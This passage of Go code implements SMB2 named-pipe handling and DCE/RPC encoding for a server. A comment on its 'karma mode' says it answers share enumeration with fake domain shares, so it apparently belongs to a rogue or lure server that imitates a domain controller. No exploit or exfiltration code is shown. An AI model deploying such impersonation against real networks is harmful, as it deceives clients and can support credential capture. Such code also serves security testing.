	var response []byte
	if opnum == SRVSVC_OPNUM_NetrShareEnum {
		response = s.handleNetrShareEnum(callID)
	} else {
		// Return fault for unsupported operations
		response = s.buildDCERPCFault(callID, 0x1c010002)
	}

	of.pipeData.pendingResponse = response
	return s.buildPipeWriteResponse(session, messageID, treeID, uint32(len(data)))
}

func (s *Server) handleNetrShareEnum(callID uint32) []byte {
	if s.debug {
		fmt.Printf("[DEBUG] NetrShareEnum request\n")
	}

	// Build share list - in karma mode, return some fake shares
	type shareInfo struct {
		name   string
		stype  uint32
		remark string
	}

	shares := []shareInfo{
		{"NETLOGON", 0, "Logon server share"},
		{"SYSVOL", 0, "Logon server share"},
		{"IPC$", 0x80000003, "Remote IPC"},
	}

	// Build NDR response
	var buf bytes.Buffer

	// SHARE_ENUM_STRUCT
	binary.Write(&buf, binary.LittleEndian, uint32(1)) // Level
	binary.Write(&buf, binary.LittleEndian, uint32(1)) // Union switch

	// Container pointer
	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000))

	// EntriesRead
	binary.Write(&buf, binary.LittleEndian, uint32(len(shares)))

	// Buffer pointer
	binary.Write(&buf, binary.LittleEndian, uint32(0x00020004))

	// Conformant array max_count
	binary.Write(&buf, binary.LittleEndian, uint32(len(shares)))

	// SHARE_INFO_1 structures
	refID := uint32(0x00020008)
	for _, share := range shares {
		binary.Write(&buf, binary.LittleEndian, refID) // netname ptr
		refID += 4
		binary.Write(&buf, binary.LittleEndian, share.stype)
		binary.Write(&buf, binary.LittleEndian, refID) // remark ptr
		refID += 4
	}

	// String data
	for _, share := range shares {
		writeNDRString(&buf, share.name)
		writeNDRString(&buf, share.remark)
	}

	// TotalEntries
	binary.Write(&buf, binary.LittleEndian, uint32(len(shares)))

	// ResumeHandle (null)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	// Return value (success)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	return s.buildDCERPCResponse(callID, buf.Bytes())
}

func writeNDRString(buf *bytes.Buffer, s string) {
	strLen := len(s) + 1
	binary.Write(buf, binary.LittleEndian, uint32(strLen))
	binary.Write(buf, binary.LittleEndian, uint32(0))
	binary.Write(buf, binary.LittleEndian, uint32(strLen))

	for _, c := range s {
		binary.Write(buf, binary.LittleEndian, uint16(c))
	}
	binary.Write(buf, binary.LittleEndian, uint16(0))

	written := strLen * 2
	if written%4 != 0 {
		padding := 4 - (written % 4)
		buf.Write(make([]byte, padding))
	}
}

func (s *Server) buildDCERPCResponse(callID uint32, stubData []byte) []byte {
	headerLen := 24
	totalLen := headerLen + len(stubData)

	resp := make([]byte, totalLen)
	resp[0] = DCERPC_VERSION
	resp[1] = DCERPC_VERSION_MINOR
	resp[2] = DCERPC_RESPONSE
	resp[3] = DCERPC_FIRST_FRAG | DCERPC_LAST_FRAG
	resp[4] = 0x10

	binary.LittleEndian.PutUint16(resp[8:10], uint16(totalLen))
	binary.LittleEndian.PutUint32(resp[12:16], callID)
	binary.LittleEndian.PutUint32(resp[16:20], uint32(len(stubData)))

	copy(resp[24:], stubData)
	return resp
}

func (s *Server) buildDCERPCFault(callID uint32, status uint32) []byte {
	resp := make([]byte, 32)
	resp[0] = DCERPC_VERSION
	resp[1] = DCERPC_VERSION_MINOR
	resp[2] = 3 // FAULT
	resp[3] = DCERPC_FIRST_FRAG | DCERPC_LAST_FRAG
	resp[4] = 0x10

	binary.LittleEndian.PutUint16(resp[8:10], 32)
	binary.LittleEndian.PutUint32(resp[12:16], callID)
	binary.LittleEndian.PutUint32(resp[24:28], status)

	return resp
}

func (s *Server) buildPipeWriteResponse(session *Session, messageID uint64, treeID uint32, count uint32) []byte {
	resp := make([]byte, 64+17)

	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_WRITE)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 17)
	binary.LittleEndian.PutUint32(body[4:8], count)

	return resp
}

func (s *Server) handlePipeRead(session *Session, of *OpenFile, messageID uint64, treeID uint32) []byte {
	data := of.pipeData.pendingResponse
	if data == nil {
		return s.buildErrorResponse(SMB2_READ, messageID, session.id, treeID, STATUS_END_OF_FILE)
	}

	of.pipeData.pendingResponse = nil

	// Build read response with DCE/RPC data
	resp := make([]byte, 64+17+len(data))
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_READ)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 17)
	body[2] = 0x50 // DataOffset
	binary.LittleEndian.PutUint32(body[4:8], uint32(len(data)))
	copy(body[16:], data)

	return resp
}

// Helper functions

func utf16LEDecode(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	u16s := make([]uint16, len(b)/2)
	for i := range u16s {
		u16s[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	// Remove null terminator
	for len(u16s) > 0 && u16s[len(u16s)-1] == 0 {
		u16s = u16s[:len(u16s)-1]
	}
	runes := make([]rune, len(u16s))
	for i, v := range u16s {
		runes[i] = rune(v)
	}
	return string(runes)
}

func utf16LEEncode(s string) []byte {
	runes := []rune(s)
	b := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(b[i*2:], uint16(r))
	}
	return b
}

func fileTimeFromTime(t time.Time) uint64 {
	// FILETIME = 100-nanosecond intervals since January 1, 1601
	return uint64(t.UnixNano()/100 + 116444736000000000)
}
